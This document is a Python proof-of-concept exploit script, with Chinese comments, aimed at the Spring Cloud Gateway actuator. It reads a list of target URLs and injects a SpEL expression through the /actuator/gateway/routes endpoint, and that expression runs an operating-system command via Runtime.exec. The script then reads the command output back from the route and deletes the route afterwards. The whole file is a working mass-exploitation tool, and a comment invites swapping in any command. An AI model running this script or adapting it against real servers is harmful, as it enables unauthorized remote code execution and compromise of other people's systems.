import requests
import json
import sys
print("usage: python3 spring_cloud_poc.py ./urls.txt")
print("url格式：https://xxx.xx.xx/  每行一个")
from requests.packages.urllib3.exceptions import InsecureRequestWarning
# 禁用安全请求警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
f=open(sys.argv[1],"r")
headers2 = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

urls=[]
for url in f:
    try:
        re2 = requests.post(url=url.strip() + "/actuator/gateway/refresh" ,headers=headers2,verify=False,allow_redirects=False)
        if re2.status_code==200:
            #print(url.strip())
            #print(re2.text)
            urls.append(url.strip())
        else: 
            print(url.strip()+"\t"+ "not affected")
    except Exception:
        continue
        
def exec(url):

    headers1 = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/json'
    }

    headers2 = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }


    ## command to execute replace "id" in payload

    payload = '''{
      "id": "ssssss",
      "filters": [{
        "name": "AddResponseHeader",
        "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"id\\"}).getInputStream()))}"}\r
        }],
      "uri": "http://example.com",
      "order": 0
    }'''

   

    
    re1 = requests.post(url=url + "/actuator/gateway/routes/ssssss",data=payload,headers=headers1,json=json,verify=False,allow_redirects=False)
    re2 = requests.post(url=url + "/actuator/gateway/refresh" ,headers=headers2,verify=False,allow_redirects=False)
    re3 = requests.get(url=url + "/actuator/gateway/routes/ssssss",headers=headers2,verify=False,allow_redirects=False)
    re4 = requests.delete(url=url + "/actuator/gateway/routes/ssssss",headers=headers2,verify=False,allow_redirects=False)
    re5 = requests.post(url=url + "/actuator/gateway/refresh" ,headers=headers2,verify=False,allow_redirects=False)
    if "ssssss" in re3.text:
        print(url+ "\t" +re3.text)
    else:
        print(url+ "\t" + "not affected")
for url in urls:
    try:
        exec(url)
    except Exception:
        continue
        
print("finish")

